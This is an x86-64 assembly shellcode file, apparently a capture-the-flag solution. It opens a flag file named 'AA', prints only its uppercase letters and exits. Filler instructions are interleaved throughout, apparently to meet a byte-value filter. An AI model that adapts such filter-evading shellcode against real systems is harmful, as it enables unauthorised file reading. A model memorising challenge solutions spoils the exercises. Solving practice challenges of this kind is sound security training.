.intel_syntax noprefix
.global _start

# goal:
# read and print all uppercase letters from the flag file and then exit(0)

# we should guarantee these parameters:
# rsi, rax, rdx, rdi are initially 0 TODO
# flag file name: "AA"
# file content length: 128

_start:
mov bl, 0xff
mov ax, 0x4141	# 0xb8
mov bl, 0xb7

push rax
push rsp
mov bl, 0xb6

# open
pop rdi
or bl, 0xb5

xor eax, eax
mov cl, 0xb4

mov al, 2
mov cl, 0xb3

syscall
mov cl, 0xb2

# read
mov edi, eax
mov cl, 0xb1

push rsp
pop rsi
mov cl, 0xb0

mov dl, 128
mov cl, 0xaf

xor eax, eax
mov cl, 0xae

syscall
mov cl, 0xad

# loop to print only uppercase letters
xor ecx, ecx
mov bl, 0xac

mov cl, 128
mov bl, 0xab

push rsp
pop rbp
mov bl, 0xaa

jmp loop_begin
.byte 0, 0xa9, 0, 0
loop_begin:
cmp byte ptr [rbp], 0x60	# 0x7d
mov bl, 0x7c
jg not_upper_case
mov bl, 0x7b

# write
xor edi, edi
mov bl, 0x7a

mov al, 1
mov bl, 0x79

push rbp
pop rsi
mov bl, 0x78

mov edx, eax
mov bl, 0x77

mov edi, eax
mov bl, 0x76

push rcx
or bl, 0x75
syscall
mov bl, 0x74
pop rcx
or bl, 0x73

not_upper_case:
inc rbp
push rdi	# 0x57
loop loop_begin
mov bl, 0x46


# exit(0)
xor edi, edi
mov bl, 0x45

xor eax, eax
mov bl, 0x44

mov al, 60
syscall	# 0x05

